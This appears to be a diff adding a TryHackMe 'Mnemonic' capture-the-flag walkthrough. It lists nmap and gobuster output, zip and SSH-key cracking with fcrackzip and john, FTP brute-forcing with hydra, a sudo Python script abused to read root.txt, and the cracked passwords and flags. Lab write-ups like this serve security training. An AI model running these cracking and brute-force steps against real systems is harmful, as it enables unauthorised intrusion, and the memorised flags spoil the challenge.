@@ -1,0 +1,100 @@
+ip address:10.10.236.174
+
+Nmap:
+PORT     STATE    SERVICE       VERSION
+21/tcp   open     ftp           vsftpd 3.0.3
+1337/tcp open     ssh           OpenSSH 7.6p1
+80/tcp   open     http          Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+1119/tcp filtered bnetgame
+5001/tcp filtered commplex-link
+6580/tcp filtered parsec-master
+7019/tcp filtered doceri-ctl
+9618/tcp filtered condor
+Service Info: OS: Unix
+
+
+gobuster on ip:
+
+found: 
+/admin
+/webmasters
+
+on webmasters found /backups
+on /backups found backups.zip
+
+Downloaded backups.zip but it is password protected. Used fcrackzip to get the passwd: fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backups.zip -v
+
+pass is: 00385007
+
+unzip the file and found this: 
+
+@vill
+
+James new ftp username: ftpuser
+we have to work hard
+
+Try to brute force the ftp user with hydra:
+
+hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt -vv ftp://10.10.236.174
+
+21][ftp] host: 10.10.236.174   login: ftpuser   password: love4ever
+
+got an id_rsa file
+
+converted the private key: ssh2john id_rsa > ssh.hash
+
+got the passphrase from the ssh.hash: john ssh.hash -wordlist/usr/share/wordlist/rockyou.txt
+
+bluelove         (id_rsa) 
+
+first change id_rsa permissions: chmod 600 id_rsa
+
+Log in to ssh using james and id_rsa
+
+use passphrase when asked, use it again for password
+
+noteforjames.txt
+
+@vill
+
+james i found a new encryption İmage based name is Mnemonic  
+
+I created the condor password. don't forget the beers on saturday
+
+find: ‘/home/condor/'VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ=='’: Permission denied
+
+this string is:THM{a5f82a00e2feee3465249b855be71c01}
+
+find: ‘/home/condor/aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==’: Permission denied
+
+this string is :https://i.ytimg.com/vi/K-96JmC2AkE/maxresdefault.jpg
+
+used this repo to get the passwd: https://github.com/MustafaTanguner/Mnemonic
+
+condor passwd: pasificbell1981
+
+
+run sudo -l and notice you can run /bin/examplecode.py
+
+Run the script by typing sudo /usr/bin/python3 /bin/examplecode.py
+
+Type “0“, then hit enter. Then type “.” and hit enter again
+
+type cat /root/root.txt
+
+
+Select:0
+are you sure you want to quit ? yes : .
+
+Running....cat /root/root.txt
+THM{congratulationsyoumadeithashme}
+0
+
+Root flag needs to be in THM{md5} format:
+
+condor@mnemonic:~$ echo -n "congratulationsyoumadeithashme" | md5sum
+2a4825f50b0c16636984b448669b0586  -
+
+root flag: THM{2a4825f50b0c16636984b448669b0586}
